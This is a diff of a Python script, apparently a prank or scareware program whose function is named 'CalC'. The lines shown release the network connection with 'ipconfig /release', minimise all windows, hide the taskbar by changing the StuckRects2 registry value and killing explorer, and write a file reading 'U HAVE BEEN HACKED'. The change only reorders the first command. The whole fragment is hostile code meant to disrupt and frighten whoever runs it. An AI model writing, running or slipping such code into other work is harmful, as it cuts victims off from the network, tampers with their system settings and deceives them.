@@ -10800,8 +10800,8 @@
 import os
 try:
  def CalC():
-	 #1.Disable internet && minimise window --(cmd1)
-  cmd1="ipconfig /release && powershell -command \"& { $x = New-Object -ComObject Shell.Application; $x.minimizeall() }\" "
+	 #1.minimise window && disable internet --(cmd1)
+  cmd1="powershell -command \"& { $x = New-Object -ComObject Shell.Application; $x.minimizeall() }\" && ipconfig /release"
   os.system(cmd1)
   #2.Hide Taskbar && Create Display File -- (cmd2)
   cmd2="powershell -command \"&{$p=\'HKCU:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StuckRects2\';$v=(Get-ItemProperty -Path $p).Settings;$v[8]=3;&Set-ItemProperty -Path $p -Name Settings -Value $v;&Stop-Process -f -ProcessName explorer}\" && echo U HAVE BEEN HACKED .>zero.txt"
